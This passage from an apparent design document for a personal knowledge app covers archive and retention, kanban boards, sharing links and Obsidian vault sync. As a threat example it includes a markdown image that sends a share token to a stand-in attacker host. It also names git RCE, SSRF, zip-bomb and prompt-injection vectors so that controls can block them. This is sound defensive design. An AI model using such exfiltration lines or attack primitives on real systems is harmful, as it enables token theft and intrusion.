`lib/framework/obsiddy/priority/reprioritise.ts` batch-writes `priorityScore` + `priorityFactors`, triggered nightly, on subtree mutations (debounced), and by `obsiddy_reprioritise`. **Setting or clearing a boost triggers an immediate single-row rescore**, not a wait for the nightly job — a pin that takes until 3am to take effect is a bug report.

---

## 11. Lifecycle — archive, prune and obsolescence

A second brain that only ever accumulates becomes unusable in about eighteen months: search gets noisier, the connection sweep spends its budget on dead projects, and the ranked list fills with things you stopped caring about in 2024. This needs designing now, because the retention windows have to be _fields_ from the first migration or you'll be backfilling them later against real data.

### Three states, and only one of them destroys anything

| State        | What it means                                                                                         | Reversible?        |
| ------------ | ----------------------------------------------------------------------------------------------------- | ------------------ |
| **active**   | normal                                                                                                | —                  |
| **archived** | hidden from every default list, search, sweep and prompt; still readable at its URL; still exportable | **yes**, one click |
| **pruned**   | row deleted                                                                                           | no                 |

**Nothing a human wrote is ever auto-pruned.** Thoughts, tasks, projects, goals and reviews auto-_archive_ on a schedule and stop there, permanently, until you say otherwise. Only derived and log data is auto-pruned. This distinction is the whole design — get it wrong and the product's core promise ("put everything here, it's safe") is false.

`archivedAt DateTime?` + `archivedReason String?` (`manual | aged_out | project_closed`) on the five entity tables, with every default query gaining `archivedAt: null` and `@@index([userId, archivedAt])`. Prefer a nullable timestamp over a boolean — you will want to know _when_, and it costs nothing.

### The trap: archived items and the vector index

The obvious move — keep the embedding row and filter it out in the search SQL — is wrong, and it's the kind of wrong that only shows up once the data is big.

HNSW is an _approximate_ index: it walks a graph to find ~`ef_search` candidates and then your `WHERE` clause throws some away. If a large share of the corpus is archived, the filter discards most of what the graph returned and you get back **fewer rows than you asked for**, quietly, with no error. The result is a search that degrades as the user's history grows — precisely backwards.

**So: archiving deletes the `ObsiddyEmbedding` rows; unarchiving re-enqueues.** The source text lives on the entity row and is never lost, `indexedHash` is nulled so the existing tick backfill re-embeds on restore, and the HNSW index stays proportional to _live_ data rather than total history. Re-embedding one restored item costs a fraction of a cent. This also keeps the archived corpus out of the connection sweep and out of agent context for free, with no filter to forget.

Archived items remain findable by **keyword** — the `searchVector` tsvector stays, and `GET /obsiddy/search?includeArchived=true` runs BM25-only. "I know I wrote something about this two years ago" still works; it just doesn't pollute the semantic surface.

### What ages out, and when

Windows live in `ObsiddySpace.retentionPolicy Json` (Zod-validated, defaults below), user-tunable in settings. Enforced by `enforceObsiddyRetention(userId)`, modelled directly on the existing `enforceRetentionPolicies()` in `lib/orchestration/retention.ts` and run from the nightly workflow.

| Data                                                          | Default                                   | Action                                                                                 |
| ------------------------------------------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------------- |
| Thoughts still in `inbox`, untouched                          | 90 days                                   | **archive** + count in the weekly review ("47 thoughts aged out — review or let go")   |
| Completed tasks                                               | 180 days                                  | **archive**; embeddings dropped                                                        |
| Projects `done`/`abandoned`                                   | 180 days after close                      | **archive**, and cascade-archive their tasks                                           |
| Goals `achieved`/`dropped`                                    | after their horizon has passed + 1 period | **archive**                                                                            |
| Reviews                                                       | 2 years                                   | **archive**                                                                            |
| Entities with no linked activity                              | 365 days                                  | **flag in the stale digest** — never auto-archive; a dormant client is not a dead one  |
| Documents                                                     | never                                     | **kept** — deliberately uploaded reference material; archive manually only             |
| Boards, tags                                                  | never                                     | **kept** — configuration, not content. Archive manually                                |
| `ObsiddyBoardCard` rows whose task was archived               | with the task                             | **prune** — an explicit board shouldn't hold ghosts                                    |
| `ObsiddyChecklistItem`                                        | with the task                             | **cascade** (real FK, `onDelete: Cascade`)                                             |
| `ObsiddyLink` with `status: 'rejected'`                       | never                                     | **kept forever** — see below                                                           |
| `ObsiddyLink` `suggested`, never actioned                     | 60 days                                   | **prune** (derived data, regenerable)                                                  |
| `ObsiddyEvent`                                                | 400 days                                  | **prune** — highest-volume table by far, and a rolling year covers every review period |
| `ObsiddyVaultSyncRun` plans                                   | 30 days                                   | **prune**                                                                              |
| Vault snapshots in blob storage                               | 30 days                                   | **prune** (already specified in §14)                                                   |
| `ObsiddyTimeBlock` with `source: 'plan'`, past and unactioned | 90 days                                   | **prune**                                                                              |

**Rejected connections are kept forever, and this matters more than it looks.** The sweep excludes any pair that already has a `ObsiddyLink` row, so a `rejected` row _is_ the tombstone that stops the same suggestion returning every Sunday for the rest of your life. The `@@unique([userId, sourceType, sourceId, targetType, targetId, kind])` constraint from §1 is what makes this work. Pruning rejected links would silently reintroduce an infinite nag loop — put a comment on the retention table saying so, because it looks like dead data and someone _will_ try to clean it up.

### Obsolescence is a question, not a rule

Age is a poor proxy for irrelevance. A life goal untouched for a year isn't dead; a project untouched for six weeks probably is. So the system **proposes and you decide** — no silent status changes on anything with a status.

The monthly `obsiddy-horizon-check` workflow already scores goals on evidenced activity; extend it to emit a **stale-items digest**: projects with no activity and no completed tasks in 90 days, goals whose target date passed with no linked progress, areas with zero logged time in 60 days, and **entities with no linked activity in 90 days** ("you haven't touched Acme since April — still a client?"). Each row gets one-click _still live_ / _archive_ / _drop_. Choosing "still live" writes `lastActivityAt = now()`, which is honest — you _did_ just engage with it — and stops it reappearing next month.

The stale digest is the one place the agent should be a bit blunt. Copy per CLAUDE.md's rule: plain English and concrete actions, no softening.

### Restore, and the two interactions that bite

- **Restore** — `POST /api/v1/obsiddy/{type}/[id]/restore` clears `archivedAt`, nulls `indexedHash` (re-embed), and writes a `ObsiddyEvent`. An archived list view per type, plus `GET /obsiddy/search?includeArchived=true`, are the only two ways to reach archived items — deliberately not in the main nav.
- **Vault sync** — an archived item's file **moves to `Archive/<type>/` in the vault, it is not deleted.** Deleting files is the one operation §14 spends three mitigations avoiding; archival must not become a back door to it. Restoring moves it back. A file _manually_ dragged into `Archive/` in Obsidian archives the row — a genuinely nice gesture that costs one path check.
- **Sharing** — archiving an item does **not** revoke its share links or grants, and archived items stay readable at their public URL. Archiving is a decluttering action on _your_ view; silently 404-ing a link you gave to 200 people because you tidied your project list would be indefensible. The archive UI warns when the item has active shares and offers to revoke them in the same action.

Erasure is unaffected: archived rows carry `userId` like any other and cascade identically.

---

## 12. Boards, cards and export

A kanban board is a **view over data that already exists**, not a new subsystem. `ObsiddyTask.status` is already `todo | next | doing | waiting | done | dropped` — those are the columns, and `GET /obsiddy/tasks` already returns tasks enriched with project, area and score in a single call. Dragging between columns is a `PATCH` of one field.

### The one new dependency, and the one to avoid

**`@dnd-kit/core` + `@dnd-kit/sortable`** (~15 KB combined). Not `react-beautiful-dnd` — it is unmaintained and does not work correctly under React 19 (the repo is on `react@19.2.7`). Not native HTML5 drag-and-drop either: it is **completely inaccessible to keyboard users** and unusable on touch, and this app is explicitly meant to work on a phone. dnd-kit ships keyboard sensors and touch support, which is the actual reason to pick it.

### Ordering: the scorer wins, with one escape hatch

Kanban tools let you hand-sort a column because they have no opinion about what matters. **This app has a scorer**, so hand-sorting means maintaining an order `score.ts` already computes — and the two will silently disagree.

- **Within a column, order by `priorityScore DESC`.** No arbitrary mid-column reordering on a filter-backed board.
- **Dragging a card to the top of a column sets `manualBoost`** (§10) rather than a separate position field. That reuses the existing override _including its 7-day expiry_, so "this one first" behaves identically whether done on the board or in a list — and decays rather than silently rotting.
- **Dragging between columns changes `status`.** That is the gesture that carries real information.
- **`ObsiddyBoardCard.position` exists but is only honoured when `membership: 'explicit'`** — a hand-curated board (a sprint, a shortlist, a client's work-in-flight) is a legitimate case for manual order, because there the ordering _is_ the content. Fractional indexing: insert at `(prev + next) / 2`, renormalise the column when the gap drops below `1e-6`.

Two ordering mechanisms exist, but they never apply to the same board. That separation is the point — don't let explicit positions leak into filter-backed boards.

### WIP limits and aging — the parts that earn their place

- **`wipLimit` per column.** Capping `doing` is the one genuinely valuable kanban idea: it stops you starting six things. Exceeding it flags the column rather than blocking the drop — a hard block just teaches people to lie to the tool.
- **Aging indicators.** A card sitting in `doing` for eleven days should look wrong. Compute from the `ObsiddyEvent` timestamp of the last status change; no new column.

  _Phase 5 note — built as specified, with one honest gap._ Two things were needed
  first: `updated` events did not record **which field** changed, and reading every
  card's history would have undone the board's batching. Both are now solved —
  `statusChangeMetadata` writes `{ statusFrom, statusTo }` when (and only when) the
  status actually moved, and `findLatestStatusChanges` reads the newest per task in a
  single `DISTINCT ON`, so the board's fixed query count survives.

  The card therefore shows **"9d in Doing"** — the real §12 signal. Two cases have no
  answer and are not given one: a card created and never moved, and a card last moved
  before the metadata existed. Those fall back to "untouched 11d" (time since
  `updatedAt`) and are worded differently, so neither number is ever presented as the
  other. A recorded move whose `statusTo` no longer matches the card's current status
  is also discarded — reporting it would be a confident wrong number.

- **Swimlanes** by project, area or **client entity** — "show me the board for Acme" is the same query plus one filter, free now that `ObsiddyEntity` exists (§1).

### Card content

Trello-equivalent, reusing what's already there:

| Trello concept         | Here                                                                                                                                                                                                  |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description / bullets  | `ObsiddyTask.notes` (existing `Text`), rendered with `react-markdown` + `remark-gfm` — **both already dependencies**. No raw HTML, matching `components/admin/orchestration/markdown-or-raw-view.tsx` |
| Labels                 | `ObsiddyTag` + `ObsiddyTaskTag`                                                                                                                                                                       |
| Checklists             | `ObsiddyChecklistItem`, with a `3/7` progress pill on the card face                                                                                                                                   |
| Due date               | `ObsiddyTask.dueAt` (existing)                                                                                                                                                                        |
| Attachments            | link a `ObsiddyDocument` via `ObsiddyLink` — no new table                                                                                                                                             |
| Card links / relations | `ObsiddyLink` (existing), rendered as chips                                                                                                                                                           |
| External links         | URLs in `notes`, sanitised through `sanitizeUrl()` from `lib/security/sanitize.ts`                                                                                                                    |

**Tags are a table, not a `String[]` column.** A string array is simpler and tempting, but renaming a label across 500 tasks means rewriting 500 rows, and Trello-style labels need a colour. A join table also makes tags a first-class board filter and swimlane dimension. This mirrors the platform's own `KnowledgeTag` decision, and its docs record the same reasoning.

### Export to Trello and elsewhere

"Exportable to Trello" is one phrase covering two very different jobs, and the split matters for sequencing.

**Trello has no "import JSON" button.** Its own board-export JSON cannot be re-imported through the UI. So there are three honest paths:

| Path                                                                                                                      | Needs                                                         | Ship in   |
| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- | --------- |
| **CSV export** — one row per card, Trello-compatible column headers (`Name`, `Description`, `Labels`, `Due Date`, `List`) | nothing                                                       | Release 1 |
| **JSON export** in Trello's board shape (`lists[]`, `cards[]`, `labels[]`)                                                | nothing                                                       | Release 1 |
| **Live push via the Trello REST API** — creates board → lists → cards → checklists → labels                               | a per-user API key + token, i.e. `lib/security/secret-box.ts` | Release 4 |

**Ship CSV and JSON first.** They cost a day, need no credentials, and CSV imports into Trello Premium, Jira, Asana, Notion and Linear alike — so "export to external boards" is satisfied generically rather than for one vendor. The live API push is genuinely useful but it drags in per-user credential storage, which is the single most expensive piece of infrastructure in this plan (§17, risk 6). Do not let a nice-to-have export pull `secret-box` forward into Release 1.

Export is **owner-scoped and read-only**: `GET /obsiddy/boards/[id]/export?format=csv|json`. It exports the owner's own board. It does **not** export shared-in boards — that would turn a read grant into a data-extraction tool against someone else's data.

### Chat-created tasks

Tasks the agent creates via `obsiddy_upsert_task` mid-conversation land on the board immediately — same table, no sync step. The gap is _noticing_ them, so add a **"4 added from chat today"** filter chip. `ObsiddyTask` needs no new column: `ObsiddyEvent` already logs creation and its `payload Json` can carry the origin.

---

## 13. Sharing — named grants and public links

### Schema

Two orthogonal facts, deliberately not merged: `visibility` on the entity (only about the public-link surface, so the hot path never joins), and named grants entirely in `ObsiddyGrant` rows.

**Shareable: `area`, `goal`, `project`, `review`, `board`, `task`. Not `thought`.**

> **Revised decision.** An earlier draft excluded `task`, on the grounds that a task's meaning is its parent project and that sharing tasks doubles the access-check surface on the highest-cardinality table. The kanban requirement (§12) overrides that — a board is worthless if you can't hand someone a single card. The cost is real and stands: `resolveObsiddyAccessMany` must be genuinely batched on task lists, never per-row, and the isolation matrix grows. Recorded here rather than quietly reversed.

**A thought stays unshareable.** The raw capture inbox is the likeliest place for something you'd be mortified to leak. **Making it unshareable is a feature.** Want to share a thought? Promote it to a task first, which is the workflow anyway.

### Sharing a board: the dynamic-filter trap

A board with `membership: 'filter'` is a live query. Sharing it doesn't share a fixed set of cards — it shares **every task matching the filter, including ones created later**. That's what people expect from "share my board", and it's also a standing leak: a task you create next Tuesday that happens to match becomes visible to that grantee with no further action from you.

Three mitigations, all required:

- **Show the filter in plain English in the share dialog** — "Anyone with this link sees tasks matching: project = Acme Redesign, status is not done. This includes tasks you add later."
- **Show a live count** of currently-matching tasks before confirming.
- **Offer "share a snapshot instead"**, which flips the board to `membership: 'explicit'` and materialises today's matches into `ObsiddyBoardCard` rows. For anything leaving your organisation this is the safer choice, and the UI should say so.

An explicit-membership board has no such problem — its contents are exactly the rows you put in it.

**Board cascade** is one level, computed at read time like every other cascade: board → its cards' tasks (title, status, due, tags, checklist progress — **never `notes`** unless `includeTaskDetail` is on). A shared board never exposes the tasks' parent projects, their links to non-shared items, or their `priorityScore`. A shared _task_ likewise exposes its own tags and checklist but not its project, its `manualBoostReason`, or its score.

- `ObsiddyGrant` — `userId` is the **owner** (preserves the invariant), `granteeUserId` (null until accepted, FK `ON DELETE CASCADE`), `granteeEmail`, `role` (`viewer|commenter`), `inviteTokenHash`, `expiresAt`, `revokedAt`. `@@unique([entityType, entityId, granteeEmail])`.
- `ObsiddyShareLink` — `tokenHash @unique` (sha256), `tokenPrefix` for UI, `includeChildren`, `expiresAt`, `revokedAt`, `viewCount`.
- `ObsiddyComment` — makes `role='commenter'` mean something. `userId` = owner, `authorUserId` FK `ON DELETE CASCADE`.

**Deliberate deviation from codebase precedent: hash the public-link token.** `AiAgentEmbedToken`/`AiAgentInviteToken` store plaintext cuids — fine, they're admin-issued and deployment-scoped. A brain share link is a bearer credential to a private person's life; a DB dump or log leak must not hand over every user's notes. Use `randomBytes(24).toString('base64url')` (192 bits), **not a cuid** — cuids are timestamp-prefixed and monotonic, precisely wrong for "unguessable". Document the deviation in a schema comment.

### Cascade

**Sharing a project DOES include its tasks, read-only. It does NOT include thoughts, or links to items the grantee can't see.** A project without its tasks is a title and a paragraph; users work around it by pasting task lists into descriptions, which is worse. But the cascade is **one level and typed, never transitive**: project → its tasks; goal → child goals and projects (and their tasks); **area → nothing automatically**.

**Computed at read time from the parent grant, never denormalised into child rows.** Denormalising means every task insert/move must fix up grants, and a missed fix-up is a leak.

Redaction inside a cascade: shared tasks expose title/status/due only, **never `notes`**, unless `includeTaskDetail` (default off). Links from a shared item to a non-shared item are **omitted entirely**, not rendered redacted — "Project X blocks [redacted]" is itself a leak.

### Access resolution

`lib/framework/obsiddy/access/resolve.ts`, modelled on `adminCanViewConversation`:

```ts
resolveObsiddyAccess({ viewer, entityType, entityId, need }): Promise<ObsiddyAccessResult>
resolveObsiddyAccessMany(...)   // bulk form for lists — one query, not N
obsiddyVisibilityScope(viewer)  // what this viewer can see, as a scope object
```

Returns `{ ok, basis, ownerId, permissions, redact[] }`. Short-circuits to `owner` **before any grant/link query**, so the common case is one indexed `findUnique`. Cache per-request only — revocation must be immediate. Called by every GET taking an ID, every list (via scope), the public reader, the comment routes. **Not** by owner write paths.

Enforce D5 with a `no-restricted-imports` block in `lib/app/eslint.config.mjs` forbidding `@/lib/framework/obsiddy/repo/*` from importing `@/lib/framework/obsiddy/access/*` — and **restate the core `@/`-alias ban in that block**, since flat-config `no-restricted-imports` replaces rather than merges (the seam file documents this footgun).

### Shared-in items get their own surface — they do NOT appear in my lists or search

Three reasons in weight order: it preserves `WHERE userId = $1` as an unconditional invariant on every list, search and embedding query; a second brain's lists are a _planning_ surface, and someone else's project in "my projects" corrupts prioritisation and your own sense of what you've committed to; mixed-in items make ~40 list endpoints potential leaks, versus ~6 to get right.

Ship `/shared-with-me` with its own routes under `/api/v1/obsiddy/shared/*`, its own search that explicitly does **not** touch `ObsiddyEmbedding`, and no write paths.

### Public reader

`app/(public)/s/[token]/page.tsx` + `app/api/v1/obsiddy/public/[token]/route.ts`. `/s/` sits outside every protected prefix — **add `/obsiddy` to `lib/app/protected-routes.ts`; never add `/s`.**

Public viewer sees: title, body (react-markdown, no raw HTML — reuse the config in `components/admin/orchestration/markdown-or-raw-view.tsx`), status, and the cascaded child list if `includeChildren`. **Never**: owner email, other items, links to non-shared items, event history, comments, rationales, priority scores. A named grantee additionally sees owner identity, comments, and the item in `/shared-with-me` — a public link is a _document_, a named grant is a _relationship_.

Revocation sets `revokedAt`; **lift `isShareActive` from `conversation-access.ts` to a shared util so the two systems can't drift.** In the same transaction, flip `visibility` back to `private` when the last link is revoked. Expiry defaults to 30 days, max 365; `null` requires an explicit "never expires" checkbox.

**Robots — three things, all required:** add `'/s/'` to `app/robots.ts` (**core file edit**; verified absent today); per-page `robots: { index: false, follow: false, noarchive: true, nosnippet: true }` because robots.txt is advisory and doesn't remove already-indexed URLs; `X-Robots-Tag` on the API route too. Also set **`Referrer-Policy: no-referrer` on this route specifically** — the token is in the _path_, and any outbound link in a note leaks the full URL under the global `strict-origin-when-cross-origin`.

**CSP:** no relaxation needed. Note the trap: `next.config.js` sets `X-Frame-Options: DENY` for `/(.*)` unconditionally, so a framable "embed my roadmap" page is impossible without a core edit. Not a v1 problem, but design around it. `img-src` allows `https:`, so `![](https://attacker/x?t=…)` fires on view — mostly self-inflicted, **except** when the note came from an untrusted repo via vault sync. Render remote images as click-to-load placeholders on the public reader; don't tighten `img-src` globally.

### Invites

Reuse the **shape** of `lib/utils/invitation-token.ts` (sha256 hash, expiry discipline) but store the hash on `ObsiddyGrant.inviteTokenHash`, **not** in `Verification` — that's better-auth's table and its `identifier` is a global email-keyed namespace that would collide with signup invites.

Lower-case the email; if a `User` exists, still send the email but set `granteeUserId` immediately, and **return an identical response shape either way** (no account-existence disclosure). New `emails/obsiddy-share-invite.tsx` copied from `emails/invitation.tsx`. On accept, match email case-insensitively; mismatch shows a masked address via `maskEmail`; not-signed-in redirects through `safeCallbackUrl`. **The invite token grants nothing on its own** — it only binds an account to an existing grant, so a leaked invite email is useless without that mailbox. Rate-limit creation at 20/day/user or it's a spam cannon with your domain attached.

### AI layer

**Shared-in items are excluded from everything of the owner's — embeddings, context, prioritisation, background workflows. No exceptions in v1.** Make it structurally true by having the embedder take `OwnerScope`. The subtle failure is a naive union of cascaded tasks, which both corrupts "what should I do now" and leaks another person's deadlines into an LLM prompt.

**The owner's own agent sees all of the owner's items regardless of `visibility`** — comment the column so nobody later "helpfully" adds `visibility: 'private'` to an agent query.

**Grantee comments must not enter the owner's embeddings or context** — third-party text arriving in the owner's data is a prompt-injection vector aimed at the owner's agent.

### Erasure

One `registerErasureCleanupHook({ name: 'obsiddy' })` from `lib/app/bootstrap.ts`.

- **Owner erased** — everything cascades via `ObsiddySpace`. Make the reader's "not found" and "revoked" paths **the same code path** so links 404 rather than 500. `cleanupExternal` deletes `obsiddy-vaults/<userId>/` and `obsiddy-vault-snapshots/<userId>/` blobs.
- **Grantee erased — the case the default cascade gets wrong.** `ObsiddyGrant.userId` is the _owner_, so nothing cascades when the grantee goes, and `SetNull` would leave a dangling grant addressed by `granteeEmail` — retained PII belonging to the erased person, on a row they can't control. Art. 17 violation. Fix: explicit `ON DELETE CASCADE` on `granteeUserId`, **plus** a `scrubInTransaction` hook deleting grants matched by `granteeEmail` to catch _unaccepted_ invites where `granteeUserId` is still null. `ErasureTxContext` carries only `userId`, so read the email via `tx.user.findUnique` inside the hook — this works because hooks run before `user.delete()`.
- `ObsiddyComment.authorUserId` → **CASCADE**, not SetNull-and-keep: the body is free text the erased person wrote.

---

## 14. Obsidian vault sync

### Canonical markdown

Syncable: `area | goal | project | task | thought | review | entity`. Not time blocks (calendar-shaped, high-churn), not events (append-only log), not links-as-files. **Reviews sync one-way DB → vault** — they're generated artefacts, and letting vault edits flow back into something that will be regenerated is a guaranteed data-loss complaint. **Documents are export-only too** — the vault gets a stub note per document (title, frontmatter, extracted-text preview) rather than the original binary; round-tripping a 40 MB PDF through every sync is pure cost, and Obsidian can't meaningfully edit it anyway.

```
<root>/  .brain/{manifest.json,conflicts/,trash/}
         Areas/  Goals/<horizon>/  Projects/  Tasks/  Inbox/  Reviews/  People/  Documents/
```

YAML frontmatter carries `obsiddy-id`, `obsiddy-type`, `title`, `status`, structural links as wikilinks, tags. Body is everything after frontmatter minus sentineled blocks, **verbatim — never reflow, never reformat**. Hard rule.

**Deliberately absent: `updated:`.** A mutating timestamp in frontmatter means every DB touch rewrites every file and re-triggers hashing and re-embedding. Obsidian users get mtime from the filesystem. This one omission is worth more than it looks.

**Checkbox syntax — supported, asymmetrically.** One file per task is canonical, but every Project file also gets a generated block between `<!-- brain:tasks:start/end -->` sentinels with `- [ ] Title ^bt-<id>` lines (Obsidian-native block IDs survive edits). Sync reads back **exactly two things**: checkbox state and the text before the block ID. Ticking a box in the project note is _the_ Obsidian gesture — without it you've built an export, not a co-equal surface.

**Dataview `key:: value` — no on write, tolerant on read.** It's a plugin dialect with no spec and a competing successor, and inline fields interleave with prose, so round-tripping would force rewriting user prose. But if the body has `due:: 2026-08-01` and frontmatter doesn't, lift it into frontmatter on the next write and leave the inline field alone.

**Links:** structural edges (task→project, project→area) go in frontmatter as wikilinks (Obsidian resolves those and shows them in the graph); associative edges with `strength`/`rationale` go in a sentineled `## Links` section. **Any wikilink in free prose creates a `ObsiddyLink{kind:'mentions', origin:'vault', status:'proposed'}`** — highest-leverage line in the subsystem, one regex pass, and `proposed` so prose mentions never pollute prioritisation.

### Identity

`obsiddy-id` in frontmatter is primary (survives rename, move, copy); `.brain/manifest.json` is secondary and answers "what path did this live at last time?" (rename vs delete). When they disagree, **DB wins for identity** and the manifest is rebuilt.

| Case                         | Resolution                                                                                                                                                                                                     |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Renamed in Obsidian          | Update path. If the filename-derived title changed and frontmatter `title` didn't, treat as a **retitle** — that's the Obsidian gesture                                                                        |
| File deleted in vault        | **Do not delete the row.** `state='orphaned_remote'`, report it. `deletePropagation:'mirror'` is opt-in and soft-delete only — deletion is the one unrecoverable op and Obsidian file deletion is far too easy |
| Row deleted in app           | Delete the file **and** write `.brain/trash/<id>.md`                                                                                                                                                           |
| New file in vault            | Mint a cuid, write `obsiddy-id` back on the same pass. Files outside known folders are **ignored entirely**                                                                                                    |
| Duplicate IDs                | Manifest-path match keeps it; others get fresh IDs and become new rows titled `… (copy)`. Never merge, never "latest mtime wins"                                                                               |
| ID with no row for this user | Treat as new; keep the old in `obsiddy-source-id:`. **Never trust a client-supplied ID to address a row** — this is a security property                                                                        |

### Change detection and conflict resolution

Compare **normalised** forms, not raw bytes: parse to `{frontmatter: sortedRecord, body}` and hash `JSON.stringify(frontmatter) + '\n' + body.trimEnd()`. Without this, YAML key reordering, quote style, CRLF and trailing newlines produce ~80% of your "conflicts" and destroy trust in week one. Two hashes, because the round-trip is lossy in exactly one direction: frontmatter is regenerated, body is verbatim.

**Check "both changed, same result" _before_ declaring a conflict** — it happens constantly (both sides ticked done).

**Structured three-way field merge, never a text merge.** Frontmatter field diverged on both sides ⇒ **DB wins**, loser recorded in the report. Body diverged on both sides ⇒ **vault wins**, DB version written to `.brain/conflicts/<slug>-<ts>.md`. The asymmetry is the point: structured fields are mutated continuously by workflows and the ranker, and a stale file winning would silently roll back an agent decision; prose is the opposite — the vault is a text editor and the app is not, so three paragraphs must never be lost to a DB update that only touched `status`. Both failure modes stay recoverable. **Timestamp-based last-writer-wins is rejected outright** — mtimes across zip, Drive and git are unreliable and rewritten by the transports themselves.

State lives in a **satellite table, not entity columns**: `ObsiddyVault`, `ObsiddyVaultFile` (`syncedHash`, `syncedBodyHash`, `syncedFrontmatter` as the merge base, `remoteVersion`, `state`, `@@unique([vaultId, path])` so a duplicate path is a DB error not silent loss), `ObsiddyVaultSyncRun` (the dry-run plan artefact), `ObsiddyVaultCredential`.

### Transports

```ts
interface VaultTransportSession extends AsyncDisposable {
  capabilities: TransportCapabilities; // canPull, canPush, atomicCommit, versioned,
  // supportsWebhook, hasHistory, maxFiles, maxTotalBytes
  list();
  read(path);
  write(path, content);
  delete(path);
  commit(message): Promise<{ revision: string | null }>;
  abort();
}
```

Sessions are **staged** — writes accumulate, `commit()` flushes. Git gets one commit+push, zip gets one archive build, Drive batches, and every transport gets a free dry-run (`abort()` instead of `commit()`). **Degradation is by capability, never by `kind`.**

- **Zip** — `fflate` (declare it; don't free-ride on mammoth's transitive jszip). Returns a flat `{path: Uint8Array}` map with zero filesystem contact, so classic zip-slip is structurally impossible; adm-zip has a long path-traversal CVE history. Snapshot-in/snapshot-out, which works only because the merge base lives in `ObsiddyVaultFile`, not in the transport.
- **Git** — `isomorphic-git`. The only transport with genuine two-way semantics. Chosen over `simple-git` because it needs no `git` binary (matters for standalone Docker) and doesn't shell out — `simple-git` puts you one argument-injection bug away from RCE on a user-supplied remote. HTTPS-only, no SSH; treat that as a feature. Shallow `depth: 1` single-branch clone into a tmpdir. **On non-fast-forward, never force** — abort, re-clone next run.
- **Dropbox before Google Drive.** ~200 lines of REST each (avoids the ~100 MB `googleapis`). Dropbox's `list_folder` cursor gives a delta out of the box and `content_hash` is a documented stable per-file hash. Drive's `drive` scope is _restricted_ and triggers a CASA security assessment costing real money and weeks; `drive.file` avoids it but only sees files your app created. **This is the most under-estimated line item in the whole design.**
- **"Start a new vault" is not a transport** — it's `generateStarterVault(spaceId)` (folder skeleton, minimal `.obsidian/`, a README explaining the frontmatter contract, manifest) running against any transport. `ManagedTransport` is then just "zip with server-side persistence under `obsiddy-vaults/<userId>/<vaultId>/`". **This collapses four transports into three implementations plus one generator — the single biggest scope saving available.**

**New deps, three total: `yaml`, `fflate`, `isomorphic-git`.** Skip `gray-matter` — a 40-line parse/serialise over `yaml@2` gives control of delimiter/BOM/CRLF handling, and `yaml@2` preserves comments and formatting, which matters enormously when rewriting frontmatter in someone's file.

### Credentials — new infrastructure

`lib/security/secret-box.ts` — AES-256-GCM via `node:crypto`, per-record random 96-bit IV, **AAD bound to `${userId}:${vaultId}:${purpose}`** so a ciphertext lifted from one row can't be replayed into another. Keys from optional `SECRET_ENCRYPTION_KEYS` / `SECRET_ENCRYPTION_ACTIVE_KEY_ID` in `lib/app/env.ts`, so vanilla forks boot unchanged; `isSecretBoxConfigured()` gates the git/drive transports at the UI layer rather than crashing at runtime. Fail closed on unknown key ID. Add `secret` to the deny list in `lib/security/redact.ts`. **Its own reviewed commit.**

**Ship git-with-PAT and defer OAuth entirely for the first cut** — a PAT is one sealed string, no refresh dance, no consent-screen review.

### Scheduling

**Not `AiWorkflowSchedule`** (verified: cron-per-workflow, `createdBy` only, no per-user scoping). Use the maintenance tick, mirroring `backfillMissingEmbeddings`:

Claim with `SELECT … WHERE isEnabled AND nextSyncAt <= now() ORDER BY nextSyncAt LIMIT 5 FOR UPDATE SKIP LOCKED`, then **immediately** set `nextSyncAt = now() + interval` so a crash can't hot-loop. Hard caps: 5 vaults per tick, 60s wall clock per run — the chain watchdog is 5 minutes for _all eight_ tasks and one slow git clone must not eat it. Backoff `interval * min(2^failureCount, 32)` with jitter; disable and email once at `failureCount >= 8`.

> **Preferred:** add a `lib/app/maintenance-tasks.ts` seam (`registerAppMaintenanceTask({name, run})`, ~30 lines, upstreamable) rather than editing `run-tick.ts` directly. Otherwise this is a core file edit.

Manual `POST /obsiddy/vaults/:id/sync` runs inline with a 25s budget, falls back to queued. Git webhook (HMAC over raw body, verified the way `inbound/adapters/slack.ts` does it) is a nice-to-have; 15-minute polling is fine for v1.

**Partial failure:** phases `plan → snapshot → pull-apply → push-stage → commit`. Per-file failures are collected, not thrown. A phase failure calls `abort()` and leaves `ObsiddyVaultFile` untouched so the next run recomputes from the same base. **The invariant:** `syncedHash` advances for a file only after _both_ the DB write and the transport write succeeded.

### Safety

**Git SSRF.** `checkSafeProviderUrl` already kills `ssh://`, `git://`, `file://` and `ext::` (the transport-helper escape, which is straight RCE) — but it does **no DNS resolution**, and a git remote is 100% user-supplied with zero review. `lib/framework/obsiddy/vault/git/remote-guard.ts` adds: reject userinfo in the URL; reject scp-like `git@host:path` before `new URL()` sees it; **resolve the host with `dns.lookup({all:true})` and re-check every address**; re-run the guard on every redirect hop; and an operator allowlist `OBSIDDY_GIT_ALLOWED_HOSTS` defaulting to `github.com,gitlab.com,bitbucket.org,codeberg.org`. **Highest-value control here, costs nothing — ship with it populated.**

**Zip.** fflate never touches the filesystem, but enforce `normaliseVaultPath()` anyway (no absolute paths, `..`, backslashes, NUL, >1024 chars, Windows reserved names, symlink entries). The **actual** attack is a 50 MB zip expanding to 40 GB — cap decompressed size and per-entry ratio and abort mid-inflate. Caps: 20 000 files, 200 MB decompressed, 2 MB per markdown file, 100:1 ratio. **Caps apply on every transport**, and **reject the whole run rather than truncating** — a truncated listing is indistinguishable from "the user deleted 19 000 notes".

**Markdown injection.** A vault is a folder synced from the internet; its content is not fully trusted even though it's nominally the user's. Wrap note bodies in a delimited, labelled untrusted-content block (the `LOCKED CONTEXT` convention is the precedent); never let a body reach system-prompt position; **do not resolve `![[embeds]]` server-side** (unbounded expansion plus a tidy exfil primitive); cap notes and tokens per turn.

**Blast radius — all three required:**

- **Dry-run is the default for a vault's first sync and always available.** Persists the full plan to `ObsiddyVaultSyncRun.plan`, returns a per-file diff, writes nothing. Apply takes the `runId` and refuses if hashes moved. Cheap, because the session is already staged.
- **Pre-sync snapshot** before the first write of every apply run, 30-day retention. For git it's free (record the sha); **for Drive it is the only recovery path, so mandatory there.**
- **Mass-deletion circuit breaker** — refuse without explicit `confirmDestructive: true` if the plan deletes or blanks >10% of files or >50 files. The classic failure is pointing the vault at an empty folder and dutifully deleting the user's whole brain.

### Re-embedding

